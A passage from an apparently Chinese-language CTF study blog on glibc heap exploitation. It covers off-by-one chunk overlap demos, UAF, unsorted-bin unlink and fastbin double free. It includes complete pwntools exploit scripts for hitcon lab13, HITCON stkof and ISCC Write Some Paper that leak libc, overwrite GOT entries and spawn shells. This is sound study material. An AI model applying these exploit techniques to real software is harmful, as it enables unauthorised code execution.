class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#修改free的got表为puts的plt表</span></span><br><span class="line">edit(<span class="number">0</span>,p64(puts_plt)[<span class="number">0</span>:<span class="number">7</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#泄露atoi地址</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">atoi_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = atoi_addr - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="comment">#修改atoi的got表为system地址</span></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr)[<span class="number">0</span>:<span class="number">7</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>堆学习_remake</title>
    <url>/2021/10/05/%E5%A0%86%E5%AD%A6%E4%B9%A0-remake/</url>
    <content><![CDATA[<p>记录内容借鉴来源<a href="https://www.yuque.com/cyberangel/rg9gdm/vsh3kd">https://www.yuque.com/cyberangel/rg9gdm/vsh3kd</a></p>
<span id="more"></span>

<h1 id="OFF-BY-ONE——overlap-extend"><a href="#OFF-BY-ONE——overlap-extend" class="headerlink" title="OFF-BY-ONE——overlap/extend"></a>OFF-BY-ONE——overlap/extend</h1><p>溢出一个可控字节从而且更改chunk的大小以及状态（即insure位）</p>
<p>可以造成堆重叠的效果这里就联合overlap，extend一起记录</p>
<h2 id="1-对insure的fastbin-chunk的extend"><a href="#1-对insure的fastbin-chunk的extend" class="headerlink" title="1.对insure的fastbin chunk的extend"></a>1.对insure的fastbin chunk的extend</h2><p>demo</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -g test1.c -o test1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p, *q;</span><br><span class="line">    p = <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第一个0x10的chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk</span></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)p - <span class="number">0x8</span>) = <span class="number">0x41</span>;<span class="comment">// 修改第一个块的size域</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    q = <span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// 实现extend，控制了第二个块的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-对-inuse-的-smallbin-进行-extend"><a href="#2-对-inuse-的-smallbin-进行-extend" class="headerlink" title="2.对 inuse 的 smallbin 进行 extend"></a>2.对 inuse 的 smallbin 进行 extend</h2><p>demo</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -g test2.c -o test2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;首先在第<span class="number">9</span>行下断点b <span class="number">9</span>，我们看一下申请完三个chunk之后内存中的样子：</span><br><span class="line">    <span class="keyword">void</span> *p, *q;</span><br><span class="line">    p = <span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第二个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//防止与top chunk合并</span></span><br><span class="line">    *(<span class="keyword">long</span> *)((<span class="keyword">long</span>)p<span class="number">-0x8</span>) = <span class="number">0xb1</span>;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    q = <span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-对-free-的-smallbin-进行-extend"><a href="#3-对-free-的-smallbin-进行-extend" class="headerlink" title="3.对 free 的 smallbin 进行 extend"></a>3.对 free 的 smallbin 进行 extend</h2><p>demo</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -g test3 -o test3</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p, *q;</span><br><span class="line">    p = <span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个0x80的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk2</span></span><br><span class="line">    <span class="built_in">free</span>(p);<span class="comment">//首先进行释放，使得chunk1进入unsorted bin</span></span><br><span class="line">    *(<span class="keyword">long</span> *)((<span class="keyword">long</span>)p - <span class="number">0x8</span>) = <span class="number">0xb1</span>;</span><br><span class="line">    q = <span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-通过-extend-后向-overlapping"><a href="#4-通过-extend-后向-overlapping" class="headerlink" title="4.通过 extend 后向 overlapping"></a>4.通过 extend 后向 overlapping</h2><p>demo</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -g test4.c -o test4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p, *q;</span><br><span class="line">    p = <span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第1个 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第2个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第3个 0x10 的chunk3</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第4个 0x10 的chunk4    </span></span><br><span class="line">    *(<span class="keyword">long</span> *)((<span class="keyword">long</span>)p - <span class="number">0x8</span>) = <span class="number">0x61</span>;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    q = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-通过-extend-前向-overlapping"><a href="#5-通过-extend-前向-overlapping" class="headerlink" title="5.通过 extend 前向 overlapping"></a>5.通过 extend 前向 overlapping</h2><p>demo</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -g test5.c -o test5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p, *q, *r, *t;</span><br><span class="line">    p = <span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    q = <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    r = <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    t = <span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止与top合并</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)t - <span class="number">0x8</span>) = <span class="number">0x90</span>;<span class="comment">//修改pre_inuse域</span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)t - <span class="number">0x10</span>) = <span class="number">0xd0</span>;<span class="comment">//修改pre_size域</span></span><br><span class="line">    <span class="built_in">free</span>(t);<span class="comment">//unlink进行前向extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//占位块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上操作都可以通过off-by-one实现，前向合并只需要分配0x x8大小的chunk</p>
<p>就可以控制pre_size同时配合off漏洞控制insure。</p>
<h2 id="典例"><a href="#典例" class="headerlink" title="典例"></a>典例</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13</a></p>
<p>off by one 漏洞</p>
<p>题目的chunk拥有内容chunk和管理chunk，其中的管理chunk有有效</p>
<p>指针指向内容chunk，</p>
<p>我们利用off by one构造overlap形成堆复用，控制有效指针</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">heap = ELF(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">&quot;hollk&quot;</span>)  </span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">&quot;hollk&quot;</span>)  </span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + <span class="string">&quot;\x41&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0x30</span>) + p64(heap.got[<span class="string">&#x27;free&#x27;</span>]))  </span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">&quot;Done !&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base addr: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><p>由于free后未置空指针，导致的use after free</p>
<p>亦或是，因为在heaparry中含有free or not的标识，但是功能中</p>
<p>含有标识恢复的功能导致的uaf（祥云杯2021升级密码箱）</p>
<p>由于比较简单一般不会单独作为题目出现，往往结合别的漏洞复合使用</p>
<p>附件下载：<br>链接：<a href="https://pan.baidu.com/s/19StzpwizVbeyNEcY48XcFQ">https://pan.baidu.com/s/19StzpwizVbeyNEcY48XcFQ</a><br>提取码：oqlh</p>
<h1 id="unsortedbin的unlink（基础）"><a href="#unsortedbin的unlink（基础）" class="headerlink" title="unsortedbin的unlink（基础）"></a>unsortedbin的unlink（基础）</h1><p>unlink的公式如下</p>
<p>fd=point_addr-0x18</p>
<p>bk=point_addr-0x10</p>
<p>伪造chunk成功后会在下两次申请到的chunk申请到point_addr</p>
<p>以2014 HITCON stkof为例进行讲解：<br><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof</a><br>参考资料：<br><a href="https://blog.csdn.net/qq_41202237/article/details/108481889">https://blog.csdn.net/qq_41202237/article/details/108481889</a> #主要思路<br><a href="https://wzt.ac.cn/2018/10/16/s-pwn-project-4/">https://wzt.ac.cn/2018/10/16/s-pwn-project-4/</a> #payload来源<br>感谢@hollk师傅的文章<br>附件下载：<br>链接：<a href="https://pan.baidu.com/s/1tXTaLajFHdKB0Ofxnk8V4Q">https://pan.baidu.com/s/1tXTaLajFHdKB0Ofxnk8V4Q</a><br>提取码：z4p6</p>
<p>题目本身在edit的时候存在堆溢出，但是没有show所以需要构造</p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.binary = <span class="string">&quot;./stkof&quot;</span></span><br><span class="line">stkof = ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">7777</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;PID: &#x27;</span> + <span class="built_in">str</span>(proc.pidof(p)[<span class="number">0</span>]))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">head = <span class="number">0x602140</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment"># trigger to malloc buffer for io function</span></span><br><span class="line">    alloc(<span class="number">0x100</span>)  <span class="comment"># idx 1</span></span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x30</span>)  <span class="comment"># idx 2</span></span><br><span class="line">    <span class="comment"># small chunk size inorder to trigger unlink</span></span><br><span class="line">    alloc(<span class="number">0x80</span>)  <span class="comment"># idx 3</span></span><br><span class="line">    <span class="comment"># a fake chunk at global[2]=head+16 who&#x27;s size is 0x20</span></span><br><span class="line">    payload = p64(<span class="number">0</span>)  <span class="comment">#prev_size</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>)  <span class="comment">#size</span></span><br><span class="line">    payload += p64(head + <span class="number">16</span> - <span class="number">0x18</span>)  <span class="comment">#fd</span></span><br><span class="line">    payload += p64(head + <span class="number">16</span> - <span class="number">0x10</span>)  <span class="comment">#bk</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>)  <span class="comment"># next chunk&#x27;s prev_size bypass the check</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="comment"># overwrite global[3]&#x27;s chunk&#x27;s prev_size</span></span><br><span class="line">    <span class="comment"># make it believe that prev chunk is at global[2]</span></span><br><span class="line">    payload += p64(<span class="number">0x30</span>)</span><br><span class="line">    <span class="comment"># make it believe that prev chunk is free</span></span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    <span class="comment"># unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment"># overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(stkof.got[<span class="string">&#x27;free&#x27;</span>]) + p64(stkof.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(</span><br><span class="line">        stkof.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    <span class="comment"># edit free@got to puts@plt</span></span><br><span class="line">    payload = p64(stkof.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">    edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#free global[1] to leak puts addr</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    puts_addr = p.recvuntil(<span class="string">&#x27;\nOK\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line">    log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    log.success(<span class="string">&#x27;/bin/sh addr: &#x27;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">    log.success(<span class="string">&#x27;system addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">    <span class="comment"># modify atoi@got to system addr</span></span><br><span class="line">    payload = p64(system_addr)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    p.send(p64(binsh_addr))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<h1 id="fastbin-attack中的fastbin-double-free"><a href="#fastbin-attack中的fastbin-double-free" class="headerlink" title="fastbin_attack中的fastbin_double_free"></a>fastbin_attack中的fastbin_double_free</h1><p>demo</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> pre_size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> fd;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> bk;  </span><br><span class="line">&#125; CHUNK,*PCHUNK;</span><br><span class="line"></span><br><span class="line">CHUNK bss_chunk;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    <span class="keyword">void</span> *chunk_a,*chunk_b;</span><br><span class="line"></span><br><span class="line">    bss_chunk.size=<span class="number">0x21</span>;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"></span><br><span class="line">    chunk_a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)chunk_a=&amp;bss_chunk;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk_b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,chunk_b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="典例-1"><a href="#典例-1" class="headerlink" title="典例"></a>典例</h2><p>以iscc 2018的Write Some Paper为例进行讲解，不懂的可以看看上一节的内容<br>程序来源：<a href="https://github.com/mhzx020/Redirect">https://github.com/mhzx020/Redirect</a><br>参考资料：<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/">https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/</a><br>附件下载：<br>链接：<a href="https://pan.baidu.com/s/1pBxc_-8pqJr9MRlA2AvxHQ">https://pan.baidu.com/s/1pBxc_-8pqJr9MRlA2AvxHQ</a><br>提取码：2onz </p>
<p>简单题，给了后门，更改got表为后门地址，利用double更改指针就行了</p>
<p>epx</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">myelf = ELF(<span class="string">&quot;./paper&quot;</span>)</span><br><span class="line">io = process(myelf.path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_paper</span>(<span class="params">num, index, content</span>):</span></span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(num))</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_paper</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add_paper(<span class="number">0x30</span>, <span class="number">1</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add_paper(<span class="number">0x30</span>, <span class="number">2</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">del_paper(<span class="number">1</span>)</span><br><span class="line">del_paper(<span class="number">2</span>)</span><br><span class="line">del_paper(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">add_paper(<span class="number">0x30</span>, <span class="number">1</span>, p64(<span class="number">0x60202a</span>)) <span class="comment">#chunk1</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add_paper(<span class="number">0x30</span>, <span class="number">1</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add_paper(<span class="number">0x30</span>, <span class="number">1</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add_paper(<span class="number">0x30</span>, <span class="number">1</span>, <span class="string">&quot;\x40\x00\x00\x00\x00\x00&quot;</span>+p64(myelf.symbols[<span class="string">&quot;gg&quot;</span>])) <span class="comment">#0x60202a_chunk</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

